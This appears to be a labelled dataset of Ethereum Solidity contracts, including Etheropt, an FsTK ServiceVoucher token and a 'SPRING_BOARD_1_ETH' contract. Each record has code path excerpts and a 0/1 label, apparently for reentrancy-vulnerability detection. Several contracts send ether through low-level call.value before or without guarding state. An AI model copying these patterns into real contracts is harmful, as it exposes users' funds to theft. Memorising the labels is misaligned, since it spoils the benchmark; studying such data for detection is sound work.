tokenDistrusted[_step] = tokenDistrusted[_step].sub(amount); tokenContract.transfer(msg.sender, amount); emit Trust(msg.sender, amount); if( tokenDistrusted[step] <= activeSupply && locked ) { locked = false; endTimeToReturnTokens = 0; emit Unlocked(); } } event Refund(address sender, uint256 money); function refundMe() public { require(locked, \"locked\"); require( now > endTimeToReturnTokens, \"now > endTimeToReturnTokens\" ); uint256 ethTot = address(this).balance; require( ethTot > 0 , \"ethTot > 0\"); uint256 tknAmount = balance[msg.sender][step]; require( tknAmount > 0 , \"tknAmount > 0\"); balance[msg.sender][step] = 0; tokenContract.burn(tknAmount); uint256 tknTot = tokenDistrusted[step]; uint256 rate = tknAmount.mul(1e18).div(tknTot); uint256 money = ethTot.mul(rate).div(1e18); if( money > address(this).balance ) { money = address(this).balance; } msg.sender.transfer(money); emit Refund(msg.sender, money); } function ownerWithdraw() public onlyTokenSaleOwner { require(!locked, \"!locked\"); require(now > time[step], \"now > time[step]\"); require(funds[step] > 0, \"funds[step] > 0\"); uint256 amountApplied = funds[step]; funds[step] = 0; step = step+1; uint256 value; if( amountApplied > address(this).balance || time.length == step+1) value = address(this).balance; else { value = amountApplied; } msg.sender.transfer(value); } function ownerWithdrawTokens(address _tokenContract, address to, uint256 value) public onlyTokenSaleOwner returns (bool) { require( _tokenContract != address(tokenContract), \"_tokenContract != address(tokenContract)\"); return tokenInterface(_tokenContract).transfer(to, value); } function setWallet(address _wallet) public onlyTokenSaleOwner returns(bool) { require( _wallet != address(0), \"_wallet != address(0)\" ); wallet = _wallet; return true; } function () public payable { require(msg.sender == address(tokenSaleContract), \"msg.sender == address(tokenSaleContract)\"); if( etherReceived < funds[0]  ) { require( wallet != address(0), \"wallet != address(0)\" ); wallet.transfer(msg.value); } etherReceived = etherReceived.add(msg.value); } } "}
{"sol name": "40340.sol", "label": 0, "first path": "function withdrawFunds(uint amount) { if (accountIDs[msg.sender]>0) { if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) { accounts[accountIDs[msg.sender]].capital -= int(amount); msg.sender.call.value(amount)(); Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital); function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) { if (expired == false) { if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) { uint lastAccount = numAccounts; if (accountID==0) { accountID = 1; } else { lastAccount = accountID; for (accountID=accountID; accountID<=lastAccount; accountID++) { if (positions[accounts[accountID].user].expired == false) { int result = positions[accounts[accountID].user].cash / 1000000000000000000; for (uint optionID=0; optionID<numOptions; optionID++) { int moneyness = getMoneyness(options[optionID], uint(value), margin); result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000; positions[accounts[accountID].user].expired = true; uint amountToSend = uint(accounts[accountID].capital + result); accounts[accountID].capital = 0; if (positions[accounts[accountID].user].hasPosition==true) { numPositionsExpired++; accounts[accountID].user.call.value(amountToSend)(); Expire(msg.sender, accounts[accountID].user); if (numPositionsExpired == numPositions) { expired = true; ", "second path": "function withdrawFunds(uint amount) { if (accountIDs[msg.sender]>0) { if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) { accounts[accountIDs[msg.sender]].capital -= int(amount); msg.sender.call.value(amount)(); Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital); function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) { if (expired == false) { if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) { uint lastAccount = numAccounts; if (accountID==0) { accountID = 1; } else { lastAccount = accountID; for (accountID=accountID; accountID<=lastAccount; accountID++) { if (positions[accounts[accountID].user].expired == false) { int result = positions[accounts[accountID].user].cash / 1000000000000000000; for (uint optionID=0; optionID<numOptions; optionID++) { int moneyness = getMoneyness(options[optionID], uint(value), margin); result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000; positions[accounts[accountID].user].expired = true; uint amountToSend = uint(accounts[accountID].capital + result); accounts[accountID].capital = 0; if (positions[accounts[accountID].user].hasPosition==true) { numPositionsExpired++; accounts[accountID].user.call.value(amountToSend)(); Expire(msg.sender, accounts[accountID].user); if (numPositionsExpired == numPositions) { expired = true; ", "third path": "function withdrawFunds(uint amount) { if (accountIDs[msg.sender]>0) { if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) { accounts[accountIDs[msg.sender]].capital -= int(amount); msg.sender.call.value(amount)(); Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital); function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) { if (expired == false) { if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) { uint lastAccount = numAccounts; if (accountID==0) { accountID = 1; } else { lastAccount = accountID; for (accountID=accountID; accountID<=lastAccount; accountID++) { if (positions[accounts[accountID].user].expired == false) { int result = positions[accounts[accountID].user].cash / 1000000000000000000; for (uint optionID=0; optionID<numOptions; optionID++) { int moneyness = getMoneyness(options[optionID], uint(value), margin); result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000; positions[accounts[accountID].user].expired = true; uint amountToSend = uint(accounts[accountID].capital + result); accounts[accountID].capital = 0; if (positions[accounts[accountID].user].hasPosition==true) { numPositionsExpired++; accounts[accountID].user.call.value(amountToSend)(); Expire(msg.sender, accounts[accountID].user); if (numPositionsExpired == numPositions) { expired = true; ", "long path": "contract Etheropt { struct Position { mapping(uint => int) positions; int cash; bool expired; bool hasPosition; } uint public expiration; string public underlying; uint public margin; uint public realityID; bytes32 public factHash; address public ethAddr; mapping(uint => int) options; uint public numOptions; bool public expired; mapping(address => Position) positions; uint public numPositions; uint public numPositionsExpired; struct Account { address user; int capital; } mapping(bytes32 => int) orderFills; struct MarketMaker { address user; string server; } mapping(uint => MarketMaker) marketMakers; uint public numMarketMakers = 0; mapping(address => uint) marketMakerIDs; mapping(uint => Account) accounts; uint public numAccounts; mapping(address => uint) accountIDs; event Deposit(address indexed user, uint amount, int balance); event Withdraw(address indexed user, uint amount, int balance); event NewMarketMaker(address indexed user, string server); event Expire(address indexed caller, address indexed user); event OrderMatchFailure(address indexed matchUser, int matchSize, address indexed orderUser, int orderSize, uint optionID, uint price); event OrderMatch(address indexed matchUser, int matchSize, address indexed orderUser, int orderSize, uint optionID, uint price); function Etheropt(uint expiration_, string underlying_, uint margin_, uint realityID_, bytes32 factHash_, address ethAddr_, int[] strikes_) { expiration = expiration_; underlying = underlying_; margin = margin_; realityID = realityID_; factHash = factHash_; ethAddr = ethAddr_; for (uint i=0; i < strikes_.length; i++) { if (numOptions<20) { uint optionID = numOptions++; options[optionID] = strikes_[i]; } } } function getAccountID(address user) constant returns(uint) { return accountIDs[user]; } function getAccount(uint accountID) constant returns(address) { return accounts[accountID].user; } function addFunds() { if (accountIDs[msg.sender]>0) { accounts[accountIDs[msg.sender]].capital += int(msg.value); } else { uint accountID = ++numAccounts; accounts[accountID].user = msg.sender; accounts[accountID].capital += int(msg.value); accountIDs[msg.sender] = accountID; } Deposit(msg.sender, msg.value, accounts[accountIDs[msg.sender]].capital); } function withdrawFunds(uint amount) { if (accountIDs[msg.sender]>0) { if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) { accounts[accountIDs[msg.sender]].capital -= int(amount); msg.sender.call.value(amount)(); Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital); } } } function getFunds(address user, bool onlyAvailable) constant returns(int) { if (accountIDs[user]>0) { if (onlyAvailable == false) { return accounts[accountIDs[user]].capital; } else { return accounts[accountIDs[user]].capital + getMaxLossAfterTrade(user, 0, 0, 0); } } else { return 0; } } function getFundsAndAvailable(address user) constant returns(int, int) { return (getFunds(user, false), getFunds(user, true)); } function marketMaker(string server) { if (msg.value>0) throw; if (marketMakerIDs[msg.sender]>0) { marketMakers[marketMakerIDs[msg.sender]].server = server; } else { int funds = getFunds(marketMakers[i].user, false); uint marketMakerID = 0; if (numMarketMakers<6) { marketMakerID = ++numMarketMakers; } else { for (uint i=2; i<=numMarketMakers; i++) { if (getFunds(marketMakers[i].user, false)<=funds && (marketMakerID==0 || getFunds(marketMakers[i].user, false)<getFunds(marketMakers[marketMakerID].user, false))) { marketMakerID = i; } } } if (marketMakerID>0) { marketMakerIDs[marketMakers[marketMakerID].user] = 0; marketMakers[marketMakerID].user = msg.sender; marketMakers[marketMakerID].server = server; marketMakerIDs[msg.sender] = marketMakerID; NewMarketMaker(msg.sender, server); } else { throw; } } } function getMarketMakers() constant returns(string, string, string, string, string, string) { string[] memory servers = new string[](6); for (uint i=1; i<=numMarketMakers; i++) { servers[i-1] = marketMakers[i].server; } return (servers[0], servers[1], servers[2], servers[3], servers[4], servers[5]); } function getMarketMakerFunds() constant returns(int, int, int, int, int, int) { int[] memory funds = new int[](6); for (uint i=1; i<=numMarketMakers; i++) { funds[i-1] = getFunds(marketMakers[i].user, false); } return (funds[0], funds[1], funds[2], funds[3], funds[4], funds[5]); } function getOptionChain() constant returns (uint, string, uint, uint, bytes32, address) { return (expiration, underlying, margin, realityID, factHash, ethAddr); } function getMarket(address user) constant returns(uint[], int[], int[], int[]) { uint[] memory optionIDs = new uint[](20); int[] memory strikes_ = new int[](20); int[] memory positions_ = new int[](20); int[] memory cashes = new int[](20); uint z = 0; if (expired == false) { for (uint optionID=0; optionID<numOptions; optionID++) { optionIDs[z] = optionID; strikes_[z] = options[optionID]; positions_[z] = positions[user].positions[optionID]; cashes[z] = positions[user].cash; z++; } } return (optionIDs, strikes_, positions_, cashes); } function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) { if (expired == false) { if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) { uint lastAccount = numAccounts; if (accountID==0) { accountID = 1; } else { lastAccount = accountID; } for (accountID=accountID; accountID<=lastAccount; accountID++) { if (positions[accounts[accountID].user].expired == false) { int result = positions[accounts[accountID].user].cash / 1000000000000000000; for (uint optionID=0; optionID<numOptions; optionID++) { int moneyness = getMoneyness(options[optionID], uint(value), margin); result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000; } positions[accounts[accountID].user].expired = true; uint amountToSend = uint(accounts[accountID].capital + result); accounts[accountID].capital = 0; if (positions[accounts[accountID].user].hasPosition==true) { numPositionsExpired++; } accounts[accountID].user.call.value(amountToSend)(); Expire(msg.sender, accounts[accountID].user); } } if (numPositionsExpired == numPositions) { expired = true; } } } } function getMoneyness(int strike, uint settlement, uint margin) constant returns(int) { if (strike>=0) { if (settlement>uint(strike)) { if (settlement-uint(strike)<margin) { return int(settlement-uint(strike)); } else { return int(margin); } } else { return 0; } } else { if (settlement<uint(-strike)) { if (uint(-strike)-settlement<margin) { return int(uint(-strike)-settlement); } else { return int(margin); } } else { return 0; } } } function orderMatchTest(uint optionID, uint price, int size, uint orderID, uint blockExpires, address addr, address sender, uint value, int matchSize) constant returns(bool) { if (block.number<=blockExpires && ((size>0 && matchSize<0 && orderFills[sha3(optionID, price, size, orderID, blockExpires)]-matchSize<=size) || (size<0 && matchSize>0 && orderFills[sha3(optionID, price, size, orderID, blockExpires)]-matchSize>=size)) && getFunds(addr, false)+getMaxLossAfterTrade(addr, optionID, -matchSize, matchSize * int(price))>0 && getFunds(sender, false)+int(value)+getMaxLossAfterTrade(sender, optionID, matchSize, -matchSize * int(price))>0) { return true; } return false; } function orderMatch(uint optionID, uint price, int size, uint orderID, uint blockExpires, address addr, uint8 v, bytes32 r, bytes32 s, int matchSize) { addFunds(); bytes32 hash = sha256(optionID, price, size, orderID, blockExpires); if (ecrecover(hash, v, r, s) == addr && block.number<=blockExpires && ((size>0 && matchSize<0 && orderFills[hash]-matchSize<=size) || (size<0 && matchSize>0 && orderFills[hash]-matchSize>=size)) && getFunds(addr, false)+getMaxLossAfterTrade(addr, optionID, -matchSize, matchSize * int(price))>0 && getFunds(msg.sender, false)+getMaxLossAfterTrade(msg.sender, optionID, matchSize, -matchSize * int(price))>0) { if (positions[msg.sender].hasPosition == false) { positions[msg.sender].hasPosition = true; numPositions++; } if (positions[addr].hasPosition == false) { positions[addr].hasPosition = true; numPositions++; } positions[msg.sender].positions[optionID] += matchSize; positions[msg.sender].cash -= matchSize * int(price); positions[addr].positions[optionID] -= matchSize; positions[addr].cash += matchSize * int(price); orderFills[hash] -= matchSize; OrderMatch(msg.sender, matchSize, addr, size, optionID, price); } else { OrderMatchFailure(msg.sender, matchSize, addr, size, optionID, price); } } function getMaxLossAfterTrade(address user, uint optionID, int positionChange, int cashChange) constant returns(int) { bool maxLossInitialized = false; int maxLoss = 0; if (positions[user].expired == false && numOptions>0) { for (uint s=0; s<numOptions; s++) { int pnl = positions[user].cash / 1000000000000000000; pnl += cashChange / 1000000000000000000; uint settlement = 0; if (options[s]<0) { settlement = uint(-options[s]); } else { settlement = uint(options[s]); } pnl += moneySumAtSettlement(user, optionID, positionChange, settlement); if (pnl<maxLoss || maxLossInitialized==false) { maxLossInitialized = true; maxLoss = pnl; } pnl = positions[user].cash / 1000000000000000000; pnl += cashChange / 1000000000000000000; settlement = 0; if (options[s]<0) { if (uint(-options[s])>margin) { settlement = uint(-options[s])-margin; } else { settlement = 0; } } else { settlement = uint(options[s])+margin; } pnl += moneySumAtSettlement(user, optionID, positionChange, settlement); if (pnl<maxLoss) { maxLoss = pnl; } } } return maxLoss; } function moneySumAtSettlement(address user, uint optionID, int positionChange, uint settlement) internal returns(int) { int pnl = 0; for (uint j=0; j<numOptions; j++) { pnl += positions[user].positions[j] * getMoneyness(options[j], settlement, margin) / 1000000000000000000; if (j==optionID) { pnl += positionChange * getMoneyness(options[j], settlement, margin) / 1000000000000000000; } } return pnl; } function min(uint a, uint b) constant returns(uint) { if (a<b) { return a; } else { return b; } } } "}
{"sol name": "2387_1.sol", "label": 1, "first path": "function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) require(to.call.value(msg.value)(data)); return true; ", "second path": "function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) require(to.call.value(msg.value)(data)); return true; ", "third path": "function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) require(to.call.value(msg.value)(data)); return true; ", "long path": "pragma solidity ^0.4.24; pragma experimental \"v0.5.0\"; pragma experimental ABIEncoderV2; library AddressExtension { function isValid(address _address) internal pure returns (bool) { return 0 != _address; } function isAccount(address _address) internal view returns (bool result) { assembly { result := iszero(extcodesize(_address)) } } function toBytes(address _address) internal pure returns (bytes b) { assembly { let m := mload(0x40) mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, _address)) mstore(0x40, add(m, 52)) b := m } } } library Math { struct Fraction { uint256 numerator; uint256 denominator; } function isPositive(Fraction memory fraction) internal pure returns (bool) { return fraction.numerator > 0 && fraction.denominator > 0; } function mul(uint256 a, uint256 b) internal pure returns (uint256 r) { r = a * b; require((a == 0) || (r / a == b)); } function div(uint256 a, uint256 b) internal pure returns (uint256 r) { r = a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256 r) { require((r = a - b) <= a); } function add(uint256 a, uint256 b) internal pure returns (uint256 r) { require((r = a + b) >= a); } function min(uint256 x, uint256 y) internal pure returns (uint256 r) { return x <= y ? x : y; } function max(uint256 x, uint256 y) internal pure returns (uint256 r) { return x >= y ? x : y; } function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) { r = value * m; if (r / value == m) { r /= d; } else { r = mul(value / d, m); } } function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) { r = value * m; if (r / value == m) { if (r % d == 0) { r /= d; } else { r = (r / d) + 1; } } else { r = mul(value / d, m); if (value % d != 0) { r += 1; } } } function mul(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDiv(x, f.numerator, f.denominator); } function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDivCeil(x, f.numerator, f.denominator); } function div(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDiv(x, f.denominator, f.numerator); } function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDivCeil(x, f.denominator, f.numerator); } function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) { return Math.Fraction({ numerator: mul(x.numerator, y.numerator), denominator: mul(x.denominator, y.denominator) }); } } contract FsTKAuthority { function isAuthorized(address sender, address _contract, bytes data) public view returns (bool); function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool); function validate() public pure returns (bytes4); } contract Authorizable { event SetFsTKAuthority(FsTKAuthority indexed _address); modifier onlyFsTKAuthorized { require(fstkAuthority.isAuthorized(msg.sender, this, msg.data)); _; } modifier onlyFsTKApproved(bytes32 hash, uint256 approveTime, bytes approveToken) { require(fstkAuthority.isApproved(hash, approveTime, approveToken)); _; } FsTKAuthority internal fstkAuthority; constructor(FsTKAuthority _fstkAuthority) internal { fstkAuthority = _fstkAuthority; } function setFsTKAuthority(FsTKAuthority _fstkAuthority) public onlyFsTKAuthorized { require(_fstkAuthority.validate() == _fstkAuthority.validate.selector); emit SetFsTKAuthority(fstkAuthority = _fstkAuthority); } } contract ERC20 { event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); function balanceOf(address owner) public view returns (uint256); function allowance(address owner, address spender) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); } contract SecureERC20 is ERC20 { event SetERC20ApproveChecking(bool approveChecking); function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool); function increaseAllowance(address spender, uint256 value) public returns (bool); function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool); function setERC20ApproveChecking(bool approveChecking) public; } contract FsTKToken { enum DelegateMode { PublicMsgSender, PublicTxOrigin, PrivateMsgSender, PrivateTxOrigin } event Consume(address indexed from, uint256 value, bytes32 challenge); event IncreaseNonce(address indexed from, uint256 nonce); event SetupDirectDebit(address indexed debtor, address indexed receiver, DirectDebitInfo info); event TerminateDirectDebit(address indexed debtor, address indexed receiver); event WithdrawDirectDebitFailure(address indexed debtor, address indexed receiver); event SetMetadata(string metadata); event SetLiquid(bool liquidity); event SetDelegate(bool isDelegateEnable); event SetDirectDebit(bool isDirectDebitEnable); struct DirectDebitInfo { uint256 amount; uint256 startTime; uint256 interval; } struct DirectDebit { DirectDebitInfo info; uint256 epoch; } struct Instrument { uint256 allowance; DirectDebit directDebit; } struct Account { uint256 balance; uint256 nonce; mapping (address => Instrument) instruments; } function spendableAllowance(address owner, address spender) public view returns (uint256); function transfer(uint256[] data) public returns (bool); function transferAndCall(address to, uint256 value, bytes data) public payable returns (bool); function nonceOf(address owner) public view returns (uint256); function increaseNonce() public returns (bool); function delegateTransferAndCall(uint256 nonce, uint256 fee, uint256 gasAmount, address to, uint256 value, bytes data, DelegateMode mode, uint8 v, bytes32 r, bytes32 s) public returns (bool); function directDebit(address debtor, address receiver) public view returns (DirectDebit); function setupDirectDebit(address receiver, DirectDebitInfo info) public returns (bool); function terminateDirectDebit(address receiver) public returns (bool); function withdrawDirectDebit(address debtor) public returns (bool); function withdrawDirectDebit(address[] debtors, bool strict) public returns (bool); } contract ERC20Like is SecureERC20, FsTKToken { using AddressExtension for address; using Math for uint256; modifier liquid { require(isLiquid); _; } modifier canUseDirectDebit { require(isDirectDebitEnable); _; } modifier canDelegate { require(isDelegateEnable); _; } bool public erc20ApproveChecking; bool public isLiquid = true; bool public isDelegateEnable; bool public isDirectDebitEnable; string public metadata; mapping(address => Account) internal accounts; constructor(string _metadata) public { metadata = _metadata; } function balanceOf(address owner) public view returns (uint256) { return accounts[owner].balance; } function allowance(address owner, address spender) public view returns (uint256) { return accounts[owner].instruments[spender].allowance; } function transfer(address to, uint256 value) public liquid returns (bool) { Account storage senderAccount = accounts[msg.sender]; senderAccount.balance = senderAccount.balance.sub(value); accounts[to].balance += value; emit Transfer(msg.sender, to, value); return true; } function transferFrom(address from, address to, uint256 value) public liquid returns (bool) { Account storage fromAccount = accounts[from]; Instrument storage senderInstrument = fromAccount.instruments[msg.sender]; fromAccount.balance = fromAccount.balance.sub(value); senderInstrument.allowance = senderInstrument.allowance.sub(value); accounts[to].balance += value; emit Transfer(from, to, value); return true; } function approve(address spender, uint256 value) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; if (erc20ApproveChecking) { require((value == 0) || (spenderInstrument.allowance == 0)); } emit Approval( msg.sender, spender, spenderInstrument.allowance = value ); return true; } function setERC20ApproveChecking(bool approveChecking) public { emit SetERC20ApproveChecking(erc20ApproveChecking = approveChecking); } function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; require(spenderInstrument.allowance == expectedValue); emit Approval( msg.sender, spender, spenderInstrument.allowance = newValue ); return true; } function increaseAllowance(address spender, uint256 value) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; emit Approval( msg.sender, spender, spenderInstrument.allowance = spenderInstrument.allowance.add(value) ); return true; } function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; uint256 currentValue = spenderInstrument.allowance; uint256 newValue; if (strict) { newValue = currentValue.sub(value); } else if (value < currentValue) { newValue = currentValue - value; } emit Approval( msg.sender, spender, spenderInstrument.allowance = newValue ); return true; } function setMetadata0(string _metadata) internal { emit SetMetadata(metadata = _metadata); } function setLiquid0(bool liquidity) internal { emit SetLiquid(isLiquid = liquidity); } function setDelegate(bool delegate) public { emit SetDelegate(isDelegateEnable = delegate); } function setDirectDebit(bool directDebit) public { emit SetDirectDebit(isDirectDebitEnable = directDebit); } function spendableAllowance(address owner, address spender) public view returns (uint256) { Account storage ownerAccount = accounts[owner]; return Math.min( ownerAccount.instruments[spender].allowance, ownerAccount.balance ); } function transfer(uint256[] data) public liquid returns (bool) { Account storage senderAccount = accounts[msg.sender]; uint256 totalValue; for (uint256 i = 0; i < data.length; i++) { address receiver = address(data[i] >> 96); uint256 value = data[i] & 0xffffffffffffffffffffffff; totalValue = totalValue.add(value); accounts[receiver].balance += value; emit Transfer(msg.sender, receiver, value); } senderAccount.balance = senderAccount.balance.sub(totalValue); return true; } function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) } require(to.call.value(msg.value)(data)); return true; } function nonceOf(address owner) public view returns (uint256) { return accounts[owner].nonce; } function increaseNonce() public returns (bool) { emit IncreaseNonce(msg.sender, accounts[msg.sender].nonce += 1); } function delegateTransferAndCall(uint256 nonce, uint256 fee, uint256 gasAmount, address to, uint256 value, bytes data, DelegateMode mode, uint8 v, bytes32 r, bytes32 s) public liquid canDelegate returns (bool) { require(to != address(this)); address signer; address relayer; if (mode == DelegateMode.PublicMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PublicTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))), v, r, s ); relayer = tx.origin; } else if (mode == DelegateMode.PrivateMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, msg.sender)), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PrivateTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, tx.origin)), v, r, s ); relayer = tx.origin; } else { revert(); } Account storage signerAccount = accounts[signer]; require(nonce == signerAccount.nonce); emit IncreaseNonce(signer, signerAccount.nonce += 1); signerAccount.balance = signerAccount.balance.sub(value.add(fee)); accounts[to].balance += value; if (fee != 0) { accounts[relayer].balance += fee; emit Transfer(signer, relayer, fee); } if (!to.isAccount() && data.length >= 68) { assembly { mstore(add(data, 36), value) mstore(add(data, 68), signer) } if (to.call.gas(gasAmount)(data)) { emit Transfer(signer, to, value); } else { signerAccount.balance += value; accounts[to].balance -= value; } } else { emit Transfer(signer, to, value); } return true; } function directDebit(address debtor, address receiver) public view returns (DirectDebit) { return accounts[debtor].instruments[receiver].directDebit; } function setupDirectDebit( address receiver, DirectDebitInfo info ) public returns (bool) { accounts[msg.sender].instruments[receiver].directDebit = DirectDebit({ info: info, epoch: 0 }); emit SetupDirectDebit(msg.sender, receiver, info); return true; } function terminateDirectDebit(address receiver) public returns (bool) { delete accounts[msg.sender].instruments[receiver].directDebit; emit TerminateDirectDebit(msg.sender, receiver); return true; } function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) { Account storage debtorAccount = accounts[debtor]; DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit; uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1); uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount); require(amount > 0); debtorAccount.balance = debtorAccount.balance.sub(amount); accounts[msg.sender].balance += amount; debit.epoch = epoch; emit Transfer(debtor, msg.sender, amount); return true; } function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) { Account storage receiverAccount = accounts[msg.sender]; result = true; uint256 total; for (uint256 i = 0; i < debtors.length; i++) { address debtor = debtors[i]; Account storage debtorAccount = accounts[debtor]; DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit; uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1); uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount); require(amount > 0); uint256 debtorBalance = debtorAccount.balance; if (amount > debtorBalance) { if (strict) { revert(); } result = false; emit WithdrawDirectDebitFailure(debtor, msg.sender); } else { debtorAccount.balance = debtorBalance - amount; total += amount; debit.epoch = epoch; emit Transfer(debtor, msg.sender, amount); } } receiverAccount.balance += total; } } contract ServiceVoucher is Authorizable, ERC20Like { uint256 public totalSupply; string public name; string public symbol; uint8 public constant decimals = 0; bool public constant isConsumable = true; constructor( FsTKAuthority _fstkAuthority, string _name, string _symbol, string _metadata ) Authorizable(_fstkAuthority) ERC20Like(_metadata) public { name = _name; symbol = _symbol; } function mint(address to, uint256 value) public liquid onlyFsTKAuthorized returns (bool) { totalSupply = totalSupply.add(value); accounts[to].balance += value; emit Transfer(address(0), to, value); return true; } function consume(address from, uint256 value) public liquid onlyFsTKAuthorized returns (bool) { Account storage fromAccount = accounts[from]; fromAccount.balance = fromAccount.balance.sub(value); totalSupply -= value; emit Consume(from, value, bytes32(0)); emit Transfer(from, address(0), value); return true; } function delegateConsume( uint256 nonce, uint256 fee, uint256 value, bytes32 challenge, DelegateMode mode, uint8 v, bytes32 r, bytes32 s ) public liquid canDelegate returns (bool) { require(value > 0); address signer; address relayer; if (mode == DelegateMode.PublicMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, address(0))), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PublicTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, address(0))), v, r, s ); relayer = tx.origin; } else if (mode == DelegateMode.PrivateMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, msg.sender)), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PrivateTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, tx.origin)), v, r, s ); relayer = tx.origin; } else { revert(); } Account storage signerAccount = accounts[signer]; require(nonce == signerAccount.nonce); emit IncreaseNonce(signer, signerAccount.nonce += 1); signerAccount.balance = signerAccount.balance.sub(value.add(fee)); totalSupply -= value; emit Consume(signer, value, challenge); emit Transfer(signer, address(0), value); if (fee != 0) { accounts[relayer].balance += fee; emit Transfer(signer, relayer, fee); } return true; } function setMetadata(string infoUrl) public onlyFsTKAuthorized { setMetadata0(infoUrl); } function setLiquid(bool liquidity) public onlyFsTKAuthorized { setLiquid0(liquidity); } function setERC20ApproveChecking(bool approveChecking) public onlyFsTKAuthorized { super.setERC20ApproveChecking(approveChecking); } function setDelegate(bool delegate) public onlyFsTKAuthorized { super.setDelegate(delegate); } function setDirectDebit(bool directDebit) public onlyFsTKAuthorized { super.setDirectDebit(directDebit); } function transferToken(ERC20 erc20, address to, uint256 value) public onlyFsTKAuthorized { erc20.transfer(to, value); } } "}
{"sol name": "21697_1.sol", "label": 1, "first path": "function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); ", "second path": "function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); ", "third path": "function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); ", "long path": "pragma solidity ^0.4.19; contract SPRING_BOARD_1_ETH { address owner = msg.sender; function() public payable {} function Jump() public payable  { if(msg.value > 1 ether)  { msg.sender.call.value(this.balance); } } function Kill()    public    payable    { if(msg.sender==owner)        { selfdestruct(owner); } } } "}
